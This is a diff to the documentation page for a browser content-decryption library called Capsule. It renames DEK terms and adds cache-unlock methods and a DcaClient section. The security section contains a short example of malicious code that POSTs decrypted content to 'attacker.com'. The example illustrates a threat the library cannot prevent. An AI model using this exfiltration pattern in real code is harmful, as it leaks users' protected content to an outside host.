@@ -8,7 +8,7 @@ export default function ClientPage() {
         <h1>Client Integration</h1>
         <p>
           The Capsule client is a lightweight browser library that handles key
-          management, DEK caching, and content decryption using the Web Crypto
+          management, content key caching, and content decryption using the Web Crypto
           API.
         </p>
 
@@ -25,10 +25,10 @@ export default function ClientPage() {
             <strong>Key generation</strong> - RSA key pairs created on-demand
           </li>
           <li>
-            <strong>DEK caching</strong> - encrypted DEKs stored for reuse
+            <strong>content key caching</strong> - encrypted DEKs stored for reuse
           </li>
           <li>
-            <strong>Auto-renewal</strong> - time-bucketed keys are automatically
+            <strong>Auto-renewal</strong> - time-perioded keys are automatically
             renewed before expiry
           </li>
           <li>
@@ -41,14 +41,14 @@ export default function ClientPage() {
 
 // Initialize with an unlock function
 const capsule = new CapsuleClient({
-  unlock: async ({ keyId, wrappedDek, publicKey, articleId }) => {
+  unlock: async ({ keyId, wrappedContentKey, publicKey, resourceId }) => {
     // Call your server to get the encrypted DEK
     const res = await fetch('/api/unlock', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ keyId, wrappedDek, publicKey }),
+      body: JSON.stringify({ keyId, wrappedContentKey, publicKey }),
     });
-    return res.json(); // { encryptedDek, expiresAt, bucketId }
+    return res.json(); // { encryptedContentKey, expiresAt, periodId }
   }
 });
 
@@ -111,7 +111,7 @@ await capsule.processAll();`}</CodeBlock>
 
 // Listen for unlock events
 document.addEventListener('capsule:unlock', (e) => {
-  console.log('Unlocked:', e.detail.articleId);
+  console.log('Unlocked:', e.detail.resourceId);
   console.log('Content:', e.detail.content.substring(0, 100));
 });
 
@@ -121,6 +121,10 @@ document.addEventListener('capsule:error', (e) => {
 
 document.addEventListener('capsule:state', (e) => {
   console.log('State changed:', e.detail.previousState, '→', e.detail.state);
+});
+
+document.addEventListener('capsule:ready', (e) => {
+  console.log('Capsule ready, public key:', e.detail.publicKey);
 });`}</CodeBlock>
 
         <h2>HTML Markup</h2>
@@ -129,7 +133,7 @@ document.addEventListener('capsule:state', (e) => {
         </p>
         <CodeBlock language="html">{`<div 
   id="premium-content"
-  data-capsule='{"articleId":"abc123","encryptedContent":"...","iv":"...","wrappedKeys":[...]}'
+  data-capsule='{"resourceId":"abc123","encryptedContent":"...","iv":"...","wrappedKeys":[...]}'
   data-capsule-id="abc123"
 >
   <p>Loading encrypted content...</p>
@@ -148,9 +152,13 @@ document.addEventListener('capsule:state', (e) => {
   executeScripts?: boolean;   // Execute <script> tags (default: true)
   selector?: string;          // CSS selector (default: '[data-capsule]')
 
-  // DEK caching
-  dekStorage?: 'memory' | 'session' | 'persist';  // (default: 'persist')
+  // content key caching
+  contentKeyStorage?: 'memory' | 'session' | 'persist';  // (default: 'persist')
   renewBuffer?: number;       // Ms before expiry to auto-renew (default: 5000)
+
+  // IndexedDB settings
+  dbName?: string;            // Database name (default: 'capsule-keys')
+  storeName?: string;         // Store name (default: 'keypair')
 
   // Debugging
   logger?: (msg, level) => void;
@@ -170,13 +178,13 @@ document.addEventListener('capsule:state', (e) => {
 
         <h4>unlock(article, preferredKeyType?)</h4>
         <p>
-          Decrypt an encrypted article using cached DEK or by fetching a new
+          Decrypt an encrypted article using cached content key or by fetching a new
           one.
         </p>
-        <CodeBlock>{`const content = await capsule.unlock(encryptedArticle, 'tier');
+        <CodeBlock>{`const content = await capsule.unlock(encryptedArticle, 'shared');
 // Returns: Decrypted content as string`}</CodeBlock>
 
-        <h4>unlockElement(articleId)</h4>
+        <h4>unlockElement(resourceId)</h4>
         <p>Find an element by article ID, decrypt, and render content.</p>
         <CodeBlock>{`await capsule.unlockElement('article-123');
 // Finds element with data-capsule-id="article-123"
@@ -185,24 +193,77 @@ document.addEventListener('capsule:state', (e) => {
         <h4>processAll()</h4>
         <p>Process all encrypted elements on the page.</p>
         <CodeBlock>{`const results = await capsule.processAll();
-// Returns: Map<articleId, content | Error>`}</CodeBlock>
+// Returns: Map<resourceId, content | Error>`}</CodeBlock>
+
+        <h4>tryUnlockFromCache(article, preferredKeyType?)</h4>
+        <p>
+          Try to unlock using only locally-cached keys (no server call).
+          Returns decrypted content or <code>null</code> if no cached key is
+          available. Useful for restoring previously unlocked content on page
+          load without a network round-trip.
+        </p>
+        <CodeBlock>{`const cached = await capsule.tryUnlockFromCache(article);
+if (cached) {
+  showContent(cached);
+} else if (capsule.hadExpiredKeys) {
+  // Returning user with expired keys — auto-renew
+  const content = await capsule.unlock(article, capsule.expiredKeyType ?? 'shared');
+  showContent(content);
+} else {
+  showPaywall();
+}`}</CodeBlock>
+
+        <h4>hadExpiredKeys / expiredKeyType</h4>
+        <p>
+          Read-only getters available after calling{" "}
+          <code>tryUnlockFromCache()</code>. Use them to distinguish
+          &ldquo;first visit&rdquo; (no keys) from &ldquo;returning user with
+          expired keys&rdquo; so the UI can auto-renew.
+        </p>
+        <CodeBlock>{`capsule.hadExpiredKeys;   // boolean — were expired keys found?
+capsule.expiredKeyType;  // 'shared' | 'article' | null`}</CodeBlock>
+
+        <h4>prefetchSharedKey(keyId)</h4>
+        <p>
+          Pre-fetch and cache a shared key-encrypting key (KEK). After calling
+          this, all articles encrypted for the same content ID can be unlocked
+          locally without additional server round-trips.
+        </p>
+        <CodeBlock>{`// Pre-fetch shared key from first article
+const sharedKey = articles[0].wrappedKeys.find(
+  k => !k.keyId.startsWith('article:')
+);
+if (sharedKey) {
+  await capsule.prefetchSharedKey(sharedKey.keyId);
+}
+// Now all unlocks for this content ID are local
+for (const article of articles) {
+  await capsule.unlock(article);
+}`}</CodeBlock>
+
+        <h4>getElementState(resourceId)</h4>
+        <p>
+          Get the current processing state of an encrypted element.
+        </p>
+        <CodeBlock>{`const state = capsule.getElementState('article-123');
+// Returns: 'locked' | 'unlocking' | 'decrypting' | 'unlocked' | 'error' | undefined`}</CodeBlock>
 
         <h3>Low-Level Methods</h3>
 
-        <h4>decrypt(article, encryptedDek)</h4>
+        <h4>decrypt(article, encryptedContentKey)</h4>
         <p>
           Decrypt with a pre-fetched encrypted DEK. For full manual control.
         </p>
         <CodeBlock>{`const publicKey = await capsule.getPublicKey();
-const { encryptedDek } = await myServerCall(publicKey, wrappedKey);
-const content = await capsule.decrypt(encryptedArticle, encryptedDek);`}</CodeBlock>
+const { encryptedContentKey } = await myServerCall(publicKey, wrappedKey);
+const content = await capsule.decrypt(encryptedArticle, encryptedContentKey);`}</CodeBlock>
 
         <h4>decryptPayload(payload)</h4>
         <p>Decrypt a simple single-key payload (no envelope encryption).</p>
         <CodeBlock>{`const content = await capsule.decryptPayload({
   encryptedContent: 'base64...',
   iv: 'base64...',
-  encryptedDek: 'base64...'
+  encryptedContentKey: 'base64...'
 });`}</CodeBlock>
 
         <h4>hasKeyPair() / getKeyInfo() / regenerateKeyPair() / clearAll()</h4>
@@ -210,7 +271,7 @@ const content = await capsule.decrypt(encryptedArticle, encryptedDek);`}</CodeBl
         <CodeBlock>{`const exists = await capsule.hasKeyPair();
 const info = await capsule.getKeyInfo(); // { keySize, createdAt }
 const newKey = await capsule.regenerateKeyPair();
-await capsule.clearAll(); // Remove all keys and cached DEKs`}</CodeBlock>
+await capsule.clearAll(); // Remove all keys and cached content keys`}</CodeBlock>
 
         <h2>React Integration</h2>
         <CodeBlock>{`import { useState, useEffect, useRef } from 'react';
@@ -397,7 +458,7 @@ if (token) {
 const urlToken = getShareTokenFromUrl();
 if (urlToken?.valid) {
   // Redirect to correct content if needed
-  if (urlToken.payload.contentId !== currentArticleId) {
+  if (urlToken.payload.contentId !== currentResourceId) {
     window.location.href = urlToken.payload.url || \`/article/\${urlToken.payload.contentId}\`;
   }
 }`}</CodeBlock>
@@ -715,7 +776,7 @@ const blob = new Blob([keyPair.privateKey]);
           intended purpose:
         </p>
         <CodeBlock>{`// Malicious code CAN do this:
-const decryptedContent = await client.decryptArticle(payload);
+const decryptedContent = await client.unlock(article);
 await fetch('https://attacker.com', { 
   method: 'POST', 
   body: decryptedContent  // Send decrypted content (not the key!)
@@ -730,7 +791,7 @@ await fetch('https://attacker.com', {
         <h3>Additional Security Layers</h3>
         <ul>
           <li>
-            <strong>DEKs in Memory Only</strong>: Unwrapped DEKs are cached in
+            <strong>DEKs in Memory Only</strong>: Unwrapped content keys are cached in
             JavaScript memory (not persisted) and lost on page refresh
           </li>
           <li>
@@ -763,7 +824,7 @@ await fetch('https://attacker.com', {
           </li>
           <li>
             ✅ <strong>Network eavesdropping is ineffective</strong> - Only
-            wrapped DEKs are transmitted
+            wrapped content keys are transmitted
           </li>
           <li>
             ✅ <strong>Users cannot accidentally export their keys</strong> -
@@ -800,6 +861,142 @@ await fetch('https://attacker.com', {
           </li>
           <li>Content Security Policy (CSP) to prevent XSS attacks</li>
         </ul>
+
+        <h2>DCA Client</h2>
+        <p>
+          The package also exports a <code>DcaClient</code> for Distributed
+          Content Access — a protocol where publishers embed encrypted content
+          and key metadata directly in the HTML and keys are obtained from
+          issuer endpoints.
+        </p>
+
+        <h3>Quick Start</h3>
+        <CodeBlock>{`import { DcaClient } from '@sesamy/capsule';
+
+const client = new DcaClient();
+
+// Parse DCA data from the current page
+const page = client.parsePage();
+
+// Unlock via an issuer
+const keys = await client.unlock(page, 'sesamy');
+
+// Decrypt a specific content item
+const html = await client.decrypt(page, 'bodytext', keys);
+
+// Inject into the DOM
+document.querySelector('[data-dca-content-name="bodytext"]')!.innerHTML = html;
+
+// Or decrypt everything at once
+const all = await client.decryptAll(page, keys);
+for (const [name, content] of Object.entries(all)) {
+  document.querySelector(\`[data-dca-content-name="\${name}"]\`)!.innerHTML = content;
+}`}</CodeBlock>
+
+        <h3>HTML Structure</h3>
+        <p>
+          DCA pages contain a <code>&lt;script class=&quot;dca-data&quot;&gt;</code>{" "}
+          element with encrypted metadata and a{" "}
+          <code>&lt;template class=&quot;dca-sealed-content&quot;&gt;</code>{" "}
+          element holding the sealed content blocks:
+        </p>
+        <CodeBlock language="html">{`<!-- DCA metadata -->
+<script class="dca-data" type="application/json">
+{
+  "version": "1.0",
+  "resource": { "resourceId": "article-123", "..." : "..." },
+  "resourceJWT": "eyJ...",
+  "issuerJWT": { "sesamy": "eyJ..." },
+  "contentSealData": {
+    "bodytext": { "contentType": "text/html", "nonce": "...", "aad": "..." }
+  },
+  "sealedContentKeys": { "..." : "..." },
+  "issuerData": {
+    "sesamy": { "unlockUrl": "https://api.sesamy.com/unlock", "..." : "..." }
+  }
+}
+</script>
+
+<!-- Sealed content -->
+<template class="dca-sealed-content">
+  <div data-dca-content-name="bodytext">BASE64URL_CIPHERTEXT</div>
+</template>`}</CodeBlock>
+
+        <h3>Configuration</h3>
+        <CodeBlock>{`interface DcaClientOptions {
+  // Custom fetch function (e.g. to add auth headers)
+  fetch?: typeof globalThis.fetch;
+
+  // Custom unlock function — replaces the default fetch-based unlock
+  unlockFn?: (unlockUrl: string, body: unknown) => Promise<DcaUnlockResponse>;
+
+  // Period key cache for reusing keys across pages
+  periodKeyCache?: {
+    get(key: string): Promise<string | null>;
+    set(key: string, value: string): Promise<void>;
+  };
+}`}</CodeBlock>
+
+        <h3>API Reference</h3>
+
+        <h4>parsePage(root?)</h4>
+        <p>Parse DCA data and sealed content from the DOM.</p>
+        <CodeBlock>{`const page = client.parsePage();
+// Or from a specific container
+const page = client.parsePage(document.getElementById('article'));`}</CodeBlock>
+
+        <h4>parseJsonResponse(json)</h4>
+        <p>Parse DCA data from a JSON API response instead of the DOM.</p>
+        <CodeBlock>{`const res = await fetch('/api/article/123');
+const page = client.parseJsonResponse(await res.json());`}</CodeBlock>
+
+        <h4>unlock(page, issuerName, additionalBody?)</h4>
+        <p>
+          Request key material from an issuer&apos;s unlock endpoint. Pass
+          extra fields (e.g. auth tokens) via <code>additionalBody</code>.
+        </p>
+        <CodeBlock>{`const keys = await client.unlock(page, 'sesamy', {
+  authToken: 'Bearer ...',
+});`}</CodeBlock>
+
+        <h4>decrypt(page, contentName, unlockResponse)</h4>
+        <p>
+          Decrypt a single content item. Supports both direct content keys and
+          period-key wrapping.
+        </p>
+        <CodeBlock>{`const html = await client.decrypt(page, 'bodytext', keys);`}</CodeBlock>
+
+        <h4>decryptAll(page, unlockResponse)</h4>
+        <p>Decrypt all content items and return a name → content map.</p>
+        <CodeBlock>{`const results = await client.decryptAll(page, keys);
+// { bodytext: '<p>...</p>', sidebar: '<div>...</div>' }`}</CodeBlock>
+
+        <h3>Period Key Caching</h3>
+        <p>
+          DCA supports time-bucketed period keys that can decrypt content keys
+          locally. Provide a cache to reuse them across page navigations:
+        </p>
+        <CodeBlock>{`// Simple sessionStorage-based cache
+const cache = {
+  async get(key: string) {
+    return sessionStorage.getItem(key);
+  },
+  async set(key: string, value: string) {
+    sessionStorage.setItem(key, value);
+  },
+};
+
+const client = new DcaClient({ periodKeyCache: cache });
+
+// First page: keys fetched from issuer, periodKeys cached
+const page1 = client.parsePage();
+const keys1 = await client.unlock(page1, 'sesamy');
+await client.decrypt(page1, 'bodytext', keys1);
+
+// Next page: if the same period is active, no server call needed
+const page2 = client.parsePage();
+const keys2 = await client.unlock(page2, 'sesamy');
+await client.decrypt(page2, 'bodytext', keys2); // Uses cached periodKey`}</CodeBlock>
 
         <h2>Browser Compatibility</h2>
         <p>Capsule requires the Web Crypto API, which is available in:</p>
